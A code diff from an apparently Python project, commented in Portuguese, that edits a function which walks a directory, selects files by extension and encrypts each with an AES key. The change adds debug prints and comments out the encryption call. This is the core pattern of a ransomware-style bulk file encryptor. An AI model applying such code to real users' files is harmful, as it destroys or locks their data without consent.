@@ -88,7 +88,11 @@ def listar_media(senha_AES, tipos_arq):
 # função que lista todos os arquivos e criptografa
 def listar(chave_AES,diretorio, tipos_arq):
     atual = os.getcwd()
-    for caminho, diretorio, arquivo in os.walk(diretorio):
+    ignorar = diretorio + '/.avfs'
+    for caminho, diret, arquivo in os.walk(diretorio):
+        print(caminho)
+        if(caminho == diretorio + '/.avfs'):
+            print('achou')
         for arq in arquivo:
             a = caminho+'/'+arq
             extensao = os.path.splitext(a)
@@ -99,7 +103,8 @@ def listar(chave_AES,diretorio, tipos_arq):
                     else:
                         a = a.replace(" ", "\ ").replace(" (", " \("). replace(")", "\)")
                         try:
-                            criptografa(chave_AES, a)
+                            pass
+                            #criptografa(chave_AES, a)
                         except:
                             print('erro ao criptografar-> ' +str(a))
 
